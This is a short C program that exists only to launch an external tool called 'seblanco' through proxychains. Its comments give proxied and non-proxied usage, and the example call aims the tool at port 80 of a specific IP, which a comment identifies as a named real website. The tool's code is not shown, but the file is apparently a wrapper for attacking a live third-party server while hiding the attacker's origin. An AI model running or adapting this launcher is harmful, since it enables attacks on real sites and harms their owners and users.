#include <stdio.h>

int main()
{
//usage with proxy : system("proxychains ./seblanco (port) (target-ip)"); 
//usage non proxy : system("./seblanco (port) (target-ip)");
//example below
system("proxychains ./seblanco 80 72.52.197.215"); // this is www.apolloquiboloy.com

}
